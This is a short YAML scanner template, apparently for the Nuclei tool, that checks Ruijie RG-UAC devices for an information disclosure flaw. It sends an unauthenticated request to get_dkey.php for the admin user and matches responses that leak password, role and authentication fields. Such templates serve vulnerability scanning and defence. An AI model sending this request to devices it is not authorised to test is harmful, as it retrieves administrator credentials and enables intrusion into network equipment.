id: ruijie-rg-uac-password-leak
info:
  name: "锐捷 RG-UAC get_dkey.php 信息泄露漏洞"
  author: ProjectDiscoveryAI
  severity: medium
  tags: ruijie
http:
  - method: GET
    path:
      - "{{BaseURL}}/get_dkey.php?user=admin"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"password\":"
          - "\"auth_method\":"
          - "\"role\""
          - "\"pre_define\""
